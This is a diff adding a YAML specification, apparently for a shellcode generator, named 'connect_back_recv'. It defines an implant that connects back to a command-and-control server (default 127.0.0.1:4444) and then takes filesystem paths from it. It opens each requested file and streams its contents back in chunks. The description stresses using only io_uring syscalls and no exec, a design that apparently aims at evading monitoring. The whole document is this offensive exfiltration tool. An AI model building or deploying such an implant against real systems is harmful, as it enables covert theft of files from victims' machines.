@@ -1,0 +1,30 @@
+name: connect_back_recv
+description: >
+  Zero-exec remote file service via pure io_uring.
+  After socket/connect (io_uring), the only syscalls ever issued are
+  io_uring_enter with GETEVENTS: the C2 sends a filesystem path per
+  line, the shellcode opens it, streams its contents back in
+  4096-byte chunks until EOF, closes the file and waits for the next
+  path. Clearing the connection ends the mission.
+requires_kernel: "5.6"
+
+config:
+  c2_ip:   "127.0.0.1"
+  c2_port: 4444
+
+ops:
+  - socket:
+      domain: AF_INET
+      type:   SOCK_STREAM
+      result: sock_fd
+
+  - connect:
+      fd:   sock_fd
+      ip:   "{{ c2_ip }}"
+      port: "{{ c2_port }}"
+
+  # recv → parse path → openat → chunked exfil → close → repeat.
+  # recv == 0 (C2 closed the connection) → exit_clean.
+  - file_exfil_service:
+      fd:       sock_fd
+      recv_len: 128
